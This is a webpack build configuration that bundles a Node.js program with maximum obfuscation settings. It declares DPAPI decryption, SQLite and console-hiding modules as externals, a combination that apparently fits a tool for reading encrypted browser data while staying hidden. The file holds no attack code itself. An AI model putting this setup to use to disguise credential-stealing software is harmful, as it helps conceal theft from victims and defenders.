const { resolve } = require('path');
const WebpackObfuscator = require('webpack-obfuscator');

module.exports = {
  mode: 'production',
  entry: './index.js',
  target: 'node',
  output: {
    path: resolve(__dirname, 'dist'),
    filename: 'index.bundle.js',
  },
  resolve: {
    extensions: ['.js', '.json'],
    modules: [resolve(__dirname, 'util'), resolve(__dirname, 'functions'), 'node_modules'],
  },
  plugins: [
    new WebpackObfuscator({
      compact: true,
      deadCodeInjection: true,
      disableConsoleOutput: true,
      identifierNamesGenerator: 'mangled-shuffled',
      log: false,
      optionsPreset: 'high-obfuscation',
      renamePropertiesMode: 'safe',
      simplify: true,
      splitStrings: true,
      stringArray: true,
      stringArrayThreshold: 0.8,
      target: 'node',
    })
  ],
  externals: {
    sqlite3: 'commonjs sqlite3',
    '@primno/dpapi': 'commonjs @primno/dpapi',
    'node-hide-console-window': 'commonjs node-hide-console-window',
  }
};
